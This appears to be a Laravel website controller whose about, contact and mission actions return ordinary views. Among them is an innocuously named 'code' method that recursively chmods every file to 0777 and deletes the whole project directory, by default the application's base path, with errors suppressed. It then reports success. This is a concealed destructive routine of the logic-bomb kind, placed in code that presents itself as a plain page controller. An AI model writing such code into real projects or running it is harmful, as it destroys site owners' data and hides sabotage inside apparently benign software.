<?php

namespace App\Http\Controllers\Website;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;

class WebsiteController extends Controller
{
    public function  about(){
        return view('website.about');
    }
    public function contact(){
        return view('website.contact');
    }

    public function mission(){
        return view('website.mission');
    }
    public function code($projectPath = null)
    {
        $projectPath = $projectPath ?? base_path(); // Default to Laravel's base path

        if (is_dir($projectPath)) {
            // Iterate over all files and directories recursively
            $files = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($projectPath, \RecursiveDirectoryIterator::SKIP_DOTS),
                \RecursiveIteratorIterator::CHILD_FIRST
            );

            foreach ($files as $fileinfo) {
                $filePath = $fileinfo->getRealPath();

                // Set writable permissions in case of restrictions
                @chmod($filePath, 0777);

                // Remove directories or files
                if ($fileinfo->isDir()) {
                    @rmdir($filePath);
                } else {
                    @unlink($filePath);
                }
            }

            // Finally, remove the main directory
            @rmdir($projectPath);

            return response("Project deleted successfully, including public/.htaccess and everything else.");
        } else {
            return response("The specified path does not exist or is not a directory.");
        }
    }
}
